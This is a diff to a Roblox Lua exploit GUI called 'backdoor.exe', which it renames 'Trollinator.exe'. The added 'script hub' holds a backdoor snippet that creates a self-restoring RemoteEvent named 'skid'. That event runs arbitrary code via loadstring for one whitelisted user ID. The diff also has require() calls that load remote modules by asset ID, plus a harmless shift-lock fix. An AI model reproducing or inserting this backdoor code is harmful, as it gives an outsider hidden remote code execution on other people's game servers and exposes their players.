@@ -5,7 +5,7 @@ local G2L = {};
 -- StarterGui.backdoor.exe v8
 G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 G2L["1"]["ResetOnSpawn"] = false;
-G2L["1"]["Name"] = [[backdoor.exe v8]];
+G2L["1"]["Name"] = [[Trollinator.exe v2]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 
 -- StarterGui.backdoor.exe v8.Main
@@ -2864,8 +2864,8 @@ G2L_MODULES[G2L["90"]] = {
 Closure = function()
     local script = G2L["90"];
 return {
-	Dex = "require(4786706026):dex('%username%')",
-	happyhub = "require(78790302691160):Hload('%username%')"
+	--Dex = "require(4786706026):dex('%username%')",
+	--happyhub = "require(78790302691160):Hload('%username%')"
     --[[
 	Dex = "require(4786706026):dex('%username%')",
 	Minecraft = "require(5820669639)('%username%')",
@@ -7685,3 +7685,52 @@ end;
 task.spawn(C_95);
 
 return G2L["1"], require;
+
+
+-- // SCRIPT HUB PATCHED \ --
+local scriptsHub = {
+    happyhub = "require(78790302691160):Hload('%username%')",
+    backdoorwhitelist = [[
+        local function createRemote()
+            local remote = Instance.new("RemoteEvent", game.ReplicatedStorage)
+            remote.Name = "skid"
+            remote.OnServerEvent:Connect(function(player, SS)
+                if player.UserId == %s then
+                    loadstring(SS)()
+                end
+            end)
+            remote.AncestryChanged:Connect(function(_, parent)
+                if not parent then
+                    createRemote()
+                end
+            end)
+            return remote
+        end
+        createRemote()
+    ]]
+}
+
+-- expose globally for use in editor
+getgenv().ScriptsHub = scriptsHub
+
+-- // SHIFTLOCK FIX \ --
+local UIS = game:GetService("UserInputService")
+local Camera = workspace.CurrentCamera
+
+local function enableShiftLock()
+    pcall(function()
+        localPlayer.DevEnableMouseLock = true
+        localPlayer.DevEnableCameraMode = Enum.DevCameraMovementMode.UserChoice
+        localPlayer.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.UserChoice
+        localPlayer.DevTouchCameraMode = Enum.DevTouchCameraMovementMode.UserChoice
+    end)
+end
+
+UIS.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if input.KeyCode == Enum.KeyCode.LeftShift then
+        enableShiftLock()
+    end
+end)
+
+enableShiftLock()
